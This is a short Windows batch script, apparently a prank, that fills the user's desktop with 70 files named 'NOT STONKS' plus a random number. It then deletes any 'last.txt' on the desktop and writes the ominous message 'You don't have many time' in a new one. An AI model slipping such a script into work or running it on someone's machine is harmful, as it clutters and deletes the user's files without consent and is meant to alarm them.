@echo off
color 2f
echo Hi!!!
set /A a=0
set /A b=1
:g
	echo NOT STONKS >> "%userprofile%\desktop\NOT STONKS %random%.txt"
	set /A a=%a% + %b%
	if %a% == 70 goto f
	goto g
:f
if exist "%userprofile%\desktop\last.txt" del "%userprofile%\desktop\last.txt"
echo You don't have many time >> "%userprofile%\desktop\last.txt"
